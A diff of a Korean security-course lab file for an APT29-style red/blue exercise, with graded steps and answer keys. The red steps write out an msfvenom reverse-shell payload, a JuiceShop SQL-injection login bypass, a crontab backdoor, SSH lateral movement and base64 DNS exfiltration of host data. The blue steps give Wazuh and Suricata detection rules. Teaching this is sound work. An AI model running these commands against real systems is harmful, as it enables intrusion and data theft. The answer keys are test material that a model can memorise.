@@ -3,7 +3,8 @@ title: APT 캠페인 시뮬레이션 — 다단계 지능형 공격 재현
 version: non-ai
 course: battle-adv-nonai
 week: 10
-description: 실제 APT 캠페인(APT29 스타일)을 완전히 재현한다. 정찰부터 데이터 유출까지 전체 킬체인을 단일 인프라에서 실행하고, 동시에 Blue Phase에서 각 단계를 탐지/차단/분석한다.
+description: 실제 APT 캠페인(APT29 스타일)을 완전히 재현한다. 정찰부터 데이터 유출까지 전체 킬체인을 단일 인프라에서 실행하고,
+  동시에 Blue Phase에서 각 단계를 탐지/차단/분석한다.
 difficulty: hard
 duration_minutes: 150
 objectives:
@@ -20,152 +21,165 @@ infra_requirements:
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: "[RED] APT 캠페인 Phase 1 — 스텔스 정찰. SYN 스캔으로 10.20.30.0/24를 스캔하되, 탐지를 피하기 위해 느린 타이밍(-T2)을 사용하라. NSE 스크립트로 웹 서비스를 추가 분석하라."
+  instruction: '[RED] APT 캠페인 Phase 1 — 스텔스 정찰. SYN 스캔으로 10.20.30.0/24를 스캔하되, 탐지를
+    피하기 위해 느린 타이밍(-T2)을 사용하라. NSE 스크립트로 웹 서비스를 추가 분석하라.'
   hint: -sS -T2로 느린 스캔을 하고, http-enum 스크립트로 웹 경로를 탐색한다.
   category: recon
   points: 10
-  answer: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s 10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script http-enum -p 80,3000,8080 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1 | tail -15
-  answer_detail: APT29 스타일 정찰은 느린 타이밍(-T2)으로 IDS 탐지를 회피한다. 주요 포트만 대상으로 하여 노이즈를 최소화하고, NSE 스크립트로 웹 경로를 열거한다.
+  answer: sudo nmap -sS -sV -T2 --top-ports 20 --max-retries 1 --host-timeout 15s
+    10.20.30.80 -oX /tmp/apt_campaign_recon.xml 2>&1 | tail -15 && nmap --script http-enum
+    -p 80,3000,8080 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1 | tail
+    -15
+  answer_detail: APT29 스타일 정찰은 느린 타이밍(-T2)으로 IDS 탐지를 회피한다. 주요 포트만 대상으로 하여 노이즈를 최소화하고,
+    NSE 스크립트로 웹 경로를 열거한다.
   verify:
     type: output_contains
     expect: open
   target_vm: attacker
 - order: 2
-  instruction: "[RED] APT Phase 2 — Initial Access. msfvenom으로 Linux 리버스 쉘 페이로드를 생성(저장만)한 후, JuiceShop에 SQL Injection으로 관리자 접근을 획득하라."
+  instruction: '[RED] APT Phase 2 — Initial Access. msfvenom으로 Linux 리버스 쉘 페이로드를 생성(저장만)한
+    후, JuiceShop에 SQL Injection으로 관리자 접근을 획득하라.'
   hint: msfvenom으로 ELF 페이로드를 생성하고, SQLi로 admin 토큰을 획득한다.
   category: exploit
   points: 10
-  answer: "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo '--- SQLi Initial Access ---' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\\" OR 1=1--\",\"password\":\"x\"}' | python3 -m json.tool | head -10"
-  answer_detail: Weaponization(msfvenom 페이로드)과 Exploitation(SQLi)을 연계한다. 페이로드는 저장만 하고 실행하지 않는다. SQLi로 admin JWT 토큰을 획득한다.
+  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
+
+    📎 참고 (CLI): msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444
+    -f elf -o /tmp/apt_campaign_payload.elf 2>&1 | tail -3 && echo ''--- SQLi Initial
+    Access ---'' && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type:
+    application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}'' | python3 -m
+    json.tool | head -10'
+  answer_detail: Weaponization(msfvenom 페이로드)과 Exploitation(SQLi)을 연계한다. 페이로드는 저장만
+    하고 실행하지 않는다. SQLi로 admin JWT 토큰을 획득한다.
   verify:
     type: output_contains
     expect: token
   target_vm: attacker
 - order: 3
-  instruction: "[RED] APT Phase 3 — Persistence + Lateral Movement. crontab 백도어를 설치하고, SSH로 내부 서버(10.20.30.1, 10.20.30.100)에 접근을 시도하라."
+  instruction: '[RED] APT Phase 3 — Persistence + Lateral Movement. crontab 백도어를 설치하고,
+    SSH로 내부 서버(10.20.30.1, 10.20.30.100)에 접근을 시도하라.'
   hint: crontab에 비컨 엔트리를 추가하고, SSH로 측면 이동을 시도한다.
   category: exploit
   points: 10
-  answer: 'echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname && id" 2>&1 | head -3 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 "hostname && id" 2>&1 | head -3'
-  answer_detail: Persistence(crontab T1053.003)와 Lateral Movement(SSH T1021.004)를 연계한다. 실제 APT는 여러 서버에 동시에 Persistence를 설치한다.
+  answer: echo "*/10 * * * * echo APT_CAMPAIGN_BEACON > /tmp/apt_beacon.txt" | crontab
+    - && crontab -l && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3
+    -o StrictHostKeyChecking=no ccc@10.20.30.1 "hostname && id" 2>&1 | head -3 &&
+    ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no ccc@10.20.30.100 "hostname
+    && id" 2>&1 | head -3
+  answer_detail: Persistence(crontab T1053.003)와 Lateral Movement(SSH T1021.004)를
+    연계한다. 실제 APT는 여러 서버에 동시에 Persistence를 설치한다.
   verify:
     type: output_contains
     expect: APT_CAMPAIGN
   target_vm: attacker
 - order: 4
-  instruction: "[BLUE] Phase 전환 — 진행 중인 APT 캠페인을 탐지하라. Suricata 알림, auth.log, crontab 변경을 교차 분석하라."
+  instruction: '[BLUE] Phase 전환 — 진행 중인 APT 캠페인을 탐지하라. Suricata 알림, auth.log, crontab
+    변경을 교차 분석하라.'
   hint: 각 로그 소스에서 최근 이벤트를 필터링하고 상관 분석한다.
   category: defense
   points: 10
-  answer: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" && ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'','')) for l in sys.stdin if ''alert'' in l]\" 2>/dev/null" 2>&1 | tail -5 && echo "[2] SSH lateral movement:" && grep "Accepted" /var/log/auth.log 2>/dev/null | tail -5 && echo "[3] Crontab persistence:" && crontab -l 2>/dev/null | grep -v "^#" && echo "[4] Detection summary:" && echo "  Scan: DETECTED (Suricata)" && echo "  SQLi: DETECTED (WAF/Suricata)" && echo "  Persistence: PARTIAL (crontab logged, no FIM alert)" && echo "  Lateral: PARTIAL (SSH logged, no correlation rule)"'
-  answer_detail: APT 캠페인 탐지에서 Suricata(스캔/SQLi), auth.log(SSH 이동), crontab(Persistence)을 교차 분석한다. 개별 이벤트는 기록되지만 상관 분석 부재가 Gap이다.
+  answer: 'echo "=== APT Campaign Detection ===" && echo "[1] Suricata alerts:" &&
+    ssh 10.20.30.1 "tail -30 /var/log/suricata/eve.json 2>/dev/null | python3 -c \"import
+    sys,json; [print(json.loads(l).get(''alert'',{}).get(''signature'','')) for l
+    in sys.stdin if ''alert'' in l]\" 2>/dev/null" 2>&1 | tail -5 && echo "[2] SSH
+    lateral movement:" && grep "Accepted" /var/log/auth.log 2>/dev/null | tail -5
+    && echo "[3] Crontab persistence:" && crontab -l 2>/dev/null | grep -v "^#" &&
+    echo "[4] Detection summary:" && echo "  Scan: DETECTED (Suricata)" && echo "  SQLi:
+    DETECTED (WAF/Suricata)" && echo "  Persistence: PARTIAL (crontab logged, no FIM
+    alert)" && echo "  Lateral: PARTIAL (SSH logged, no correlation rule)"'
+  answer_detail: APT 캠페인 탐지에서 Suricata(스캔/SQLi), auth.log(SSH 이동), crontab(Persistence)을
+    교차 분석한다. 개별 이벤트는 기록되지만 상관 분석 부재가 Gap이다.
   verify:
     type: output_contains
     expect: APT Campaign Detection
   target_vm: secu
 - order: 5
-  instruction: "[BLUE] APT 캠페인의 탐지 Gap을 해소하는 Wazuh 상관 분석 규칙과 Suricata 커스텀 시그니처를 작성하라."
+  instruction: '[BLUE] APT 캠페인의 탐지 Gap을 해소하는 Wazuh 상관 분석 규칙과 Suricata 커스텀 시그니처를 작성하라.'
   hint: 다단계 공격 패턴(스캔 + SQLi + SSH + crontab)을 상관 분석한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/apt_campaign_rules.txt << 'EOF'
-# Wazuh: APT campaign correlation
-<group name=\"apt_campaign\">
-  <rule id=\"100400\" level=\"15\" frequency=\"4\" timeframe=\"600\">
-    <if_matched_group>apt_campaign_indicator</if_matched_group>
-    <description>APT CAMPAIGN: 4+ kill chain stages detected in 10 min</description>
-    <mitre><id>T1595</id><id>T1190</id><id>T1053</id><id>T1021</id></mitre>
-  </rule>
-</group>
+  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인
 
-# Suricata: Slow scan detection
-alert tcp any any -> 10.20.30.0/24 any (msg:\"APT: Slow scan detected\"; flags:S; threshold:type both, track by_src, count 5, seconds 300; sid:5000010; rev:1;)
-EOF
-cat /tmp/apt_campaign_rules.txt"
-  answer_detail: APT 캠페인 탐지 규칙은 10분 내 4개 이상 킬체인 단계가 감지되면 최고 레벨 알림을 발생시킨다. 느린 스캔도 5분 윈도우로 탐지한다.
+    📎 참고 (CLI): cat > /tmp/apt_campaign_rules.txt << ''EOF'' # Wazuh: APT campaign
+    correlation <group name="apt_campaign"> <rule id="100400" level="15" frequency="4"
+    timeframe="600"> <if_matched_group>apt_campaign_indicator</if_matched_group> <description>APT
+    CAMPAIGN: 4+ kill chain stages detected in 10 min</description> <mitre><id>T1595</id><id>T1190</id><id>T1053</id><id>T1021</id></mitre>
+    </rule> </group>
+
+    # Suricata: Slow scan detection alert tcp any any -> 10.20.30.0/24 any (msg:"APT:
+    Slow scan detected"; flags:S; threshold:type both, track by_src, count 5, seconds
+    300; sid:5000010; rev:1;) EOF cat /tmp/apt_campaign_rules.txt'
+  answer_detail: APT 캠페인 탐지 규칙은 10분 내 4개 이상 킬체인 단계가 감지되면 최고 레벨 알림을 발생시킨다. 느린 스캔도 5분
+    윈도우로 탐지한다.
   verify:
     type: output_contains
     expect: APT CAMPAIGN
   target_vm: siem
 - order: 6
-  instruction: "[BLUE] Wazuh Active Response를 활용하여 APT 캠페인 감지 시 자동 격리를 수행하는 설정을 작성하라."
+  instruction: '[BLUE] Wazuh Active Response를 활용하여 APT 캠페인 감지 시 자동 격리를 수행하는 설정을 작성하라.'
   hint: rule_id 100400 트리거 시 firewall-drop과 host-deny를 동시 실행한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/apt_active_response.xml << 'EOF'
-<ossec_config>
-  <active-response>
-    <command>firewall-drop</command>
-    <location>all</location>
-    <rules_id>100400</rules_id>
-    <timeout>7200</timeout>
-  </active-response>
-  <active-response>
-    <command>host-deny</command>
-    <location>all</location>
-    <rules_id>100400</rules_id>
-    <timeout>7200</timeout>
-  </active-response>
-</ossec_config>
-EOF
-cat /tmp/apt_active_response.xml"
-  answer_detail: APT 캠페인 감지(rule 100400) 시 모든 에이전트에서 동시에 firewall-drop과 host-deny를 실행하여 공격자 IP를 2시간 동안 전체 인프라에서 격리한다.
+  answer: '🖥️ UI: Wazuh Dashboard(https://SIEM_IP:443) 접속 → 해당 메뉴 확인
+
+    📎 참고 (CLI): cat > /tmp/apt_active_response.xml << ''EOF'' <ossec_config> <active-response>
+    <command>firewall-drop</command> <location>all</location> <rules_id>100400</rules_id>
+    <timeout>7200</timeout> </active-response> <active-response> <command>host-deny</command>
+    <location>all</location> <rules_id>100400</rules_id> <timeout>7200</timeout> </active-response>
+    </ossec_config> EOF cat /tmp/apt_active_response.xml'
+  answer_detail: APT 캠페인 감지(rule 100400) 시 모든 에이전트에서 동시에 firewall-drop과 host-deny를
+    실행하여 공격자 IP를 2시간 동안 전체 인프라에서 격리한다.
   verify:
     type: output_contains
     expect: active-response
   target_vm: siem
 - order: 7
-  instruction: "[RED] APT Phase 4 — 데이터 유출 시뮬레이션. 수집한 시스템 정보를 base64 인코딩하여 DNS 쿼리로 유출을 시도하라."
+  instruction: '[RED] APT Phase 4 — 데이터 유출 시뮬레이션. 수집한 시스템 정보를 base64 인코딩하여 DNS 쿼리로
+    유출을 시도하라.'
   hint: 시스템 정보를 수집하고 base64로 인코딩하여 DNS 쿼리에 포함한다.
   category: exploit
   points: 10
-  answer: 'cat /etc/hostname > /tmp/apt_staging.txt && id >> /tmp/apt_staging.txt && echo "=== DNS Exfiltration Attempt ===" && head -2 /tmp/apt_staging.txt | base64 | tr -d "\n" | head -c 50 | xargs -I{} echo "nslookup {}.exfil.apt29.test.local" && echo "Exfiltration simulated (DNS queries not actually sent to external)"'
-  answer_detail: 데이터 스테이징(T1074) 후 DNS 유출(T1048.001)을 시도한다. 시스템 정보를 수집하고 base64 인코딩하여 DNS 서브도메인으로 전송한다.
+  answer: cat /etc/hostname > /tmp/apt_staging.txt && id >> /tmp/apt_staging.txt &&
+    echo "=== DNS Exfiltration Attempt ===" && head -2 /tmp/apt_staging.txt | base64
+    | tr -d "\n" | head -c 50 | xargs -I{} echo "nslookup {}.exfil.apt29.test.local"
+    && echo "Exfiltration simulated (DNS queries not actually sent to external)"
+  answer_detail: 데이터 스테이징(T1074) 후 DNS 유출(T1048.001)을 시도한다. 시스템 정보를 수집하고 base64 인코딩하여
+    DNS 서브도메인으로 전송한다.
   verify:
     type: output_contains
     expect: DNS Exfiltration
   target_vm: attacker
 - order: 8
-  instruction: "[RED/BLUE] APT 캠페인 환경을 정리하고 킬체인 분석 보고서를 작성하라. 공격 타임라인, 탐지 커버리지, Gap, 개선 권고를 포함하라."
+  instruction: '[RED/BLUE] APT 캠페인 환경을 정리하고 킬체인 분석 보고서를 작성하라. 공격 타임라인, 탐지 커버리지, Gap,
+    개선 권고를 포함하라.'
   hint: crontab을 제거하고, 각 단계의 탐지 성공/실패를 정리한다.
   category: analysis
   points: 15
-  answer: "crontab -r 2>/dev/null; rm -f /tmp/apt_campaign_*.elf /tmp/apt_campaign_*.xml /tmp/apt_staging.txt /tmp/apt_beacon.txt 2>/dev/null && cat > /tmp/apt_campaign_report.txt << 'EOF'
-=== APT Campaign Simulation Report ===
-Date: 2026-04-06 | Scope: 10.20.30.0/24
+  answer: 'crontab -r 2>/dev/null; rm -f /tmp/apt_campaign_*.elf /tmp/apt_campaign_*.xml
+    /tmp/apt_staging.txt /tmp/apt_beacon.txt 2>/dev/null && cat > /tmp/apt_campaign_report.txt
+    << ''EOF'' === APT Campaign Simulation Report === Date: 2026-04-06 | Scope: 10.20.30.0/24
 
-Kill Chain Timeline:
-  [T+00] Recon: Slow SYN scan + NSE scripts (T1595)
-  [T+15] Weaponization: msfvenom ELF payload (T1587)
-  [T+20] Exploitation: SQL Injection on JuiceShop (T1190)
-  [T+30] Persistence: Crontab beacon (T1053.003)
-  [T+35] Lateral: SSH to secu + siem servers (T1021.004)
-  [T+45] Exfiltration: DNS tunneling attempt (T1048.001)
+    Kill Chain Timeline: [T+00] Recon: Slow SYN scan + NSE scripts (T1595) [T+15]
+    Weaponization: msfvenom ELF payload (T1587) [T+20] Exploitation: SQL Injection
+    on JuiceShop (T1190) [T+30] Persistence: Crontab beacon (T1053.003) [T+35] Lateral:
+    SSH to secu + siem servers (T1021.004) [T+45] Exfiltration: DNS tunneling attempt
+    (T1048.001)
 
-Detection Coverage:
-  | Stage | Detected | Tool | Gap |
-  |-------|----------|------|-----|
-  | Recon | YES | Suricata | Slow scan partial |
-  | Exploit | YES | WAF+Suricata | None |
-  | Persist | PARTIAL | auth.log | No FIM on crontab |
-  | Lateral | PARTIAL | auth.log | No correlation |
-  | Exfil | NO | - | No DNS monitoring |
+    Detection Coverage: | Stage | Detected | Tool | Gap | |-------|----------|------|-----|
+    | Recon | YES | Suricata | Slow scan partial | | Exploit | YES | WAF+Suricata
+    | None | | Persist | PARTIAL | auth.log | No FIM on crontab | | Lateral | PARTIAL
+    | auth.log | No correlation | | Exfil | NO | - | No DNS monitoring |
 
-Overall: 2.5/5 stages detected (50%)
+    Overall: 2.5/5 stages detected (50%)
 
-Improvements Deployed:
-  - APT campaign correlation rule (Wazuh 100400)
-  - Slow scan detection (Suricata 5000010)
-  - Active Response auto-isolation
+    Improvements Deployed: - APT campaign correlation rule (Wazuh 100400) - Slow scan
+    detection (Suricata 5000010) - Active Response auto-isolation
 
-Recommendations:
-  1. Deploy FIM on /var/spool/cron
-  2. Add SSH lateral movement correlation
-  3. Implement DNS entropy monitoring
-  4. Conduct monthly APT simulations
-EOF
-cat /tmp/apt_campaign_report.txt"
-  answer_detail: APT 캠페인 보고서는 킬체인 타임라인, 단계별 탐지 커버리지(50%), 배포된 개선 사항, 잔여 Gap, 권고사항을 포함한다.
+    Recommendations: 1. Deploy FIM on /var/spool/cron 2. Add SSH lateral movement
+    correlation 3. Implement DNS entropy monitoring 4. Conduct monthly APT simulations
+    EOF cat /tmp/apt_campaign_report.txt'
+  answer_detail: APT 캠페인 보고서는 킬체인 타임라인, 단계별 탐지 커버리지(50%), 배포된 개선 사항, 잔여 Gap, 권고사항을
+    포함한다.
   verify:
     type: output_contains
     expect: APT Campaign Simulation
